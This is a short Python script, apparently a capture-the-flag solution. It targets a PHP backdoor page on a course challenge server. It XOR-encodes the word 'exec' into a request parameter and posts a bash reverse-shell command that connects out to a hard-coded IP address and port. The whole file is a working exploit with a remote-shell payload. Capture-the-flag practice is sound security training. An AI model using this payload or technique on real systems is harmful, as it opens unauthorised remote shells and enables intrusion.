#coding=utf-8
import requests

get = ''
for s1, s2 in zip('exec', 'd00r'):
    get += chr(ord(s1) ^ ord(s2))
post = {}
post['#'] = 'bash -i >& /dev/tcp/140.113.68.170/4546 0>&1'
post[35] = 'bash -i >& /dev/tcp/140.113.68.170/4546 0>&1'
    
get = '87={}&'.format(get) * 87
get = get[:-1]
print get
print post

#r = requests.post(url = 'http://edu-ctf.csie.org:10151?87={}'.format(get), data = post)
r = requests.post(url = 'http://edu-ctf.csie.org:10151/d00r.php?' + get, data = post)
 
